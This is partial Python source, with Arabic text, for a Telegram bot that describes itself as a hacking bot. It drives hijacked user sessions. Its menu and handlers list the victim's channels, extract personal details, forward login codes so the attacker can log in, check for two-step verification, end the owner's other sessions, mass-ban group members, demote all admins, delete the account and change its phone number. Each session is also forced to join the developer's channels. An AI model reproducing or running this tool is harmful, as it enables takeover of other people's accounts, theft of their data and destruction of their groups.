...
async def change_number_code(strses, number, code, otp):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    bot = client = X
    try:
      await bot(join("PICTH0N"))
    except BaseException:
      pass
    try:
      await bot(join("o_k_q"))
    except BaseException:
      pass
    try:
...
"A" :~ [ معرفة القنوات و الكروبات التي يملكها ]

"B" :~ [ معرفة معلومات المستخدم مثل : (الرقم الأسم الأيدي) ]

"C" :~ [ تفليش القناة او الكروب ارسل لي يوزر الكروب او القناة و سوف اطرد جميع الأعضاء ]

"D" :~ [ارسال اخر رساله تحتوي على كود تسجيل دخول الى الحساب عن طريق كود تيرمكس]

"E" :~ [انضمام الى كروب قناة ] 

"F" :~ [مغادره كروب او قناة ]

"G" :~ [مسح كروب او قناة ]

"H" :~ [ تأكد اذا كان مالك الحساب مفعل التحقق بخطوتين ]

"I" :~ [انهاء جميع الجلسات ما عدا جلسة البوت]

"J" :~ [حذف الحساب]

"K" :~ [ تنزيل جميع المشرفين في كروب قناة ]

"L" ~ [ ترقية عضو الى مشرف داخل كروب قناة ]

"M" ~ [ تغير رقم الحساب لا تستخدم رقم وهمي ]
...
keyboard = [
  ...
  [
    Button.url("المطور", "https://t.me/a_t_9")
    ]
]
...
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      ...
      if op:
        ...
        return await event.respond("لقد تم طرد جلسة هذا الكود من الحساب مسبقا.\n /hack", buttons=keyboard)
      try:
        i = await userchannels(strses.text)
      except:
        return await event.reply("لقد تم طرد جلسة هذا الكود من الحساب مسبقا.\n/hack", buttons=keyboard)
      if len(i) > 3855:
...
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    ...
    if op:
      ...
      return await event.respond("لقد تم طرد جلسة هذا الكود من الحساب مسبقا", buttons=keyboard)
    await x.send_message("ارسل لي معرف او ايدي الكروب او القناة")
    grpid = await x.get_response()
    await userbans(strses.text, grpid.text)
    await event.reply("يتم حظر جميع اعضاء الكروب او القناة", buttons=keyboard)
...
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    ...
    if op:
      ...
      return await event.respond("لقد تم طرد جلسة هذا الكود من الحساب مسبقا.", buttons=keyboard)
    await x.send_message("اعطني معرف او ايدي الكروب او القناة")
    grpid = await x.get_response()
    await joingroup(strses.text, grpid.text)
    await event.reply("تم الانضمام الى الكروب او القناة", buttons=keyboard)
...
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    ...
    await event.reply("لقد تم مغادرة الكروب او القناة,", buttons=keyboard)
...
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      ...
      if op:
        ...
        return await event.respond("لقد تم طرد جلسة الكود من الحساب مسبقا.", buttons=keyboard)
      await x.send_message("اعطني معرف او ايدي كروب او قناة")
      grpid = await x.get_response()
      await delgroup(strses.text, grpid.text)
      await event.reply("تم حذف الكروب او قناة //شكرا لاستخدامك البوت.", buttons=keyboard)
...
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      ...
      if i:
        await event.reply(" ضلعي مالك الحساب ما مسوي تحقق تكدر تدخل الحساب بكل سهوله باستخدامك الامر ( D ) \n\nشكرا لك لاستخدامك البوت.", buttons=keyboard)
      else:
        await event.reply(" للأسف ضلعي مالك الحساب مسوي تحقق بخطوتين", buttons=keyboard)
...
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      ...
      await event.reply("لقد تم انهاء جميع الجلسات شكراً لأستخدامك بوت الاختراق.", buttons=keyboard)
...
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      ...
      if op:
        ...
        return await event.respond("لقد تم طرد جلسة هذا الكود من الحساب مسبقا.", buttons=keyboard)
      await x.send_message("ارسل لي معرف او ايدي الكروب اوالقناة")
      grp = await x.get_response()
      await x.send_message("الان ارسل لي المعرف")
      user = await x.get_response()
      i = await promote(strses.text, grp.text, user.text)
      await event.reply("سارفعك في الكروب او القناة.", buttons=keyboard)
...
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      ...
      if op:
        ...
        return await event.respond("لقد تم طرد جلسة هذا الكود من الحساب مسبقا.", buttons=keyboard)
      await x.send_message("الان ارسل لي معرف او ايدي الكروب او قناة")
      pro = await x.get_response()
      try:
        i = await demall(strses.text, pro.text)
      except:
        pass
      await event.reply("لقد تم حذف جميع مشرفين الكروب او القناة.", buttons=keyboard)
...
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      ...
      try:
        ...
        await event.respond("ارسل المشكله الى لحلها- @a_t_9\n**LOGS**\n" + str(e))
...
async def start(event):
    keyboard = [
      ...
      [
        Button.url("المالك", "https://t.me/a_t_9")
        ]
    ]
